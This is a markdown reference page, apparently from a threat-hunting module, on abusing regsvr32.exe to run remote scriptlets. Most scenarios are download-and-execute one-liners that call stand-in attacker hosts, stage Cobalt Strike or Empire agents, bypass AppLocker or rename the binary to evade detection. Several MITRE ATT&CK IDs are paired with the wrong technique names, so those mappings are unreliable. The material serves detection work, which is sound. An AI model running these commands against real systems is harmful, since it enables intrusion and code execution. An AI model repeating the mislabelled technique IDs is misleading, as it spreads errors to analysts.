# LOLBins — regsvr32.exe — Hands-On Use Cases

Every scenario below relies on the Squiblydoo technique documented in `01 - Overview.md` §How It Works — no child process, no DLL registration to `HKLM\SOFTWARE\Classes\CLSID`, just the in-process script execution. What changes per scenario is whether the scriptlet is hosted remotely or locally, whether the output is visible to the user, and how the technique is chained with the rest of an intrusion. MITRE ATT&CK ID(s) are tagged per scenario.

## Contents
- [Remote Scriptlet Download via HTTP/HTTPS](#remote-scriptlet-download-via-httphttps)
- [Local Scriptlet File Execution](#local-scriptlet-file-execution)
- [UNC Path Scriptlet Execution](#unc-path-scriptlet-execution)
- [Silent Execution with /s Flag](#silent-execution-with-s-flag)
- [Chained Download-and-Execute One-Liner](#chained-download-and-execute-one-liner)
- [Scriptlet Staged from a C2 Framework](#scriptlet-staged-from-a-c2-framework)
- [Bypassing AppLocker via Microsoft-Signed Binary](#bypassing-applock-via-microsoft-signed-binary)
- [Renamed Binary to Evade Path-Based Detection](#renamed-binary-to-evade-path-based-detection)
- [Direct Malicious DLL Registration](#direct-malicious-dll-registration)
- [Staged Secondary C2 Payload Post-Foothold](#staged-secondary-c2-payload-post-foothold)
- [Empire Stager via Regsvr32 Launcher](#empire-stager-via-regsvr32-launcher)
- [Legitimate-Baseline Contrast](#legitimate-baseline-contrast)

---

## Remote Scriptlet Download via HTTP/HTTPS

**MITRE ATT&CK:** [T1105](https://attack.mitre.org/techniques/T1105/) (Ingress Tool Transfer), [T1059.005](https://attack.mitre.org/techniques/T1059/005/) (Command and Scripting Interpreter: VBScript/JScript)

```cmd
regsvr32.exe /i:http://198.51.100.7/payload.sct /s scrobj.dll
```

The canonical Squiblydoo one-liner. `/i:` specifies the URL to fetch the scriptlet from; `/s` suppresses all UI output; `scrobj.dll` is a dummy/placeholder argument (the scriptlet's execution happens regardless of the DLL name). The scriptlet (XML-formatted `.sct` file) is fetched and loaded into memory, the embedded JScript/VBScript code inside its `<script>` tags executes inside `regsvr32.exe`, and no child process is spawned.

## Local Scriptlet File Execution

**MITRE ATT&CK:** T1059.005

```cmd
regsvr32.exe /i:C:\Users\Public\payload.sct /s scrobj.dll
```

Loads a scriptlet from a local file path instead of a remote URL. The scriptlet is parsed from disk (or an NTFS alternate data stream if saved there) and executed in-process. Useful where the payload was already staged onto the target via a prior delivery mechanism (a dropped file, a macro, an earlier script execution).

## UNC Path Scriptlet Execution

**MITRE ATT&CK:** T1105, [T1570](https://attack.mitre.org/techniques/T1570/) (Lateral Tool Transfer)

```cmd
regsvr32.exe /i:\\198.51.100.12\attacker_share\stage.sct /s scrobj.dll
```

Loads the scriptlet from an attacker-controlled SMB share (UNC path). This variant requires SMB connectivity but **no outbound Internet traffic** — the attacker controls the SMB server, the scriptlet is fetched and executed, and the payload runs. Useful in environments with strict outbound proxy/firewall rules.

## Silent Execution with /s Flag

**MITRE ATT&CK:** T1027 (Obfuscated Files or Information)

```cmd
regsvr32.exe /i:http://198.51.100.7/payload.sct /s scrobj.dll
```

The `/s` (silent) flag suppresses all dialog boxes, error messages, and status output. Without `/s`, a successful registration would display "DllRegisterServer in regsvr32.exe succeeded" — a visible, auditable event. With `/s`, the execution leaves no console output and no UI popups, making it more stealthy. This is the form seen in nearly all public documentation and real-world samples.

## Chained Download-and-Execute One-Liner

**MITRE ATT&CK:** T1105, T1059.005, [T1059.001](https://attack.mitre.org/techniques/T1059/001/) (Command and Scripting Interpreter: PowerShell)

```powershell
# PowerShell
powershell -Command "regsvr32.exe /i:http://198.51.100.7/beacon.sct /s scrobj.dll"

# or cmd.exe (batch-script variant)
cmd.exe /c "regsvr32.exe /i:http://198.51.100.7/beacon.sct /s scrobj.dll"
```

The regsvr32 command embedded in a parent shell (PowerShell or cmd.exe), common when the operator's initial foothold is via script injection or a macro that can only execute shell commands, not raw binaries. The shell spawns regsvr32, which fetches and executes the scriptlet.

## Scriptlet Staged from a C2 Framework

**MITRE ATT&CK:** T1105, T1059.005, [T1204.002](https://attack.mitre.org/techniques/T1204/002/) (User Execution: Malicious File) where the initial foothold was phishing-delivered

Typical real-world chain: an initial macro or phishing-delivered script gets code execution, then tasking from the operator (or a C2 server) issues:

```cmd
regsvr32.exe /i:http://c2.attacker.com/stage2 /s scrobj.dll
```

where `http://c2.attacker.com/stage2` is a C2-hosted scriptlet that, when executed, downloads and runs the full-featured C2 agent (Cobalt Strike beacon, Sliver, Empire, Metasploit meterpreter, etc.). `regsvr32.exe` here is a **stager**, not the payload itself — once the agent runs, the target's evidence trail gains a second, independent layer specific to that C2 framework.

## Bypassing AppLocker via Microsoft-Signed Binary

**MITRE ATT&CK:** [T1218.007](https://attack.mitre.org/techniques/T1218/007/) (System Binary Proxy Execution: Regsvcs/Regasm)

```cmd
regsvr32.exe /i:http://198.51.100.7/payload.sct /s scrobj.dll
```

`regsvr32.exe` is Microsoft-signed and shipped with the OS — nearly all application-control policies (AppLocker, WDAC, etc.) allowlist it by default. An attacker exploiting this can use regsvr32 to invoke malicious code (via the scriptlet) without triggering the `Image` = `cmd.exe` or `Image` = `powershell.exe` blocks that most policies enforce. The AppLocker event (if logging is enabled) will show the regsvr32 invocation, but the actual scriptlet code execution is harder to intercept at the application-control layer.

## Renamed Binary to Evade Path-Based Detection

**MITRE ATT&CK:** [T1036.003](https://attack.mitre.org/techniques/T1036/003/) (Masquerading: Rename System Utilities)

```cmd
copy C:\Windows\System32\regsvr32.exe C:\Users\Public\svchost_update.exe
C:\Users\Public\svchost_update.exe /i:http://198.51.100.7/payload.sct /s scrobj.dll
```

Copies the legitimate signed binary to a different name and path before invoking it, defeating any detection rule keyed purely on `Image` = `C:\Windows\System32\regsvr32.exe`. LOLBAS's `Full_Path` listing names exactly those two directories (`System32` and `SysWOW64`) as the only legitimate install locations — a `regsvr32`-shaped invocation from elsewhere is itself a hunting signal. However, Authenticode/file-hash checks still identify the underlying binary as Microsoft-signed `regsvr32.exe` even when renamed, so PE metadata inspection (checking `OriginalFileName` and `InternalName` in the binary's version resource) can recover the true binary identity.

## Direct Malicious DLL Registration

**MITRE ATT&CK:** T1547.010 (Persistence: Image File Execution Options), [T1547.009](https://attack.mitre.org/techniques/T1547/009/) (Persistence: Accessibility Features)

```cmd
regsvr32.exe http://198.51.100.7/malicious.dll
```

Instead of a scriptlet, point regsvr32 at a malicious DLL (local path or remote URL). The DLL's `DllRegisterServer` export runs automatically during registration. This is less common than Squiblydoo in the wild but a documented alternative. The DLL executes in-process (inside `regsvr32.exe`), so the same no-child-process hiding applies.

## Staged Secondary C2 Payload Post-Foothold

**MITRE ATT&CK:** T1105, T1059.005

An operator with an initial macro/phishing foothold or interactive shell tasked to regsvr32 as a second-stage downloader:

```cmd
regsvr32.exe /i:http://c2.internal/agents/cobalt_stage2.sct /s scrobj.dll
```

where the scriptlet fetches (via embedded JScript) and runs the Cobalt Strike beacon, a Sliver agent, or another full-featured C2 implant. The regsvr32 process is the delivery mechanism; the subsequent C2 agent's own process-tree and behavior are logged under that agent's own tool documentation (see the appropriate folder in this module).

## Empire Stager via Regsvr32 Launcher

**MITRE ATT&CK:** T1105, T1059.005, [T1140](https://attack.mitre.org/techniques/T1140/) (Deobfuscate/Decode Files or Information) where the stager is obfuscated

PowerShell Empire (and similar frameworks) include `regsvr32` launcher options that auto-generate a scriptlet payload. An operator using this launcher gets:

```cmd
regsvr32.exe /i:http://192.168.1.50:8080/launcher.sct /s scrobj.dll
```

where `launcher.sct` is an auto-generated Empire scriptlet that fetches and decodes the Empire agent (usually Base64-obfuscated PowerShell), then executes it. The payload is run entirely in-memory, inside the scriptlet's JScript engine, with no standalone `.ps1` file landing on disk.

## Legitimate-Baseline Contrast

Not an attack — included so an analyst can recognize the noise floor this technique has to hide in:

```cmd
regsvr32.exe C:\Program Files\MyApp\Component.dll
regsvr32.exe /u C:\Windows\System32\atl.dll
```

An IT administrator or installer registering or unregistering legitimate DLLs generates `regsvr32.exe` process-creation events too — but the command line targets a known application DLL path from a software vendor, never an HTTP URL or a `.sct` scriptlet file. This is the baseline a `/i:http://...` or `/i:...\.sct`-style hunt has to distinguish itself from; the Hunting Priority table in `05 - Detection and Hunting.md` ranks the signals by which attacks they catch.
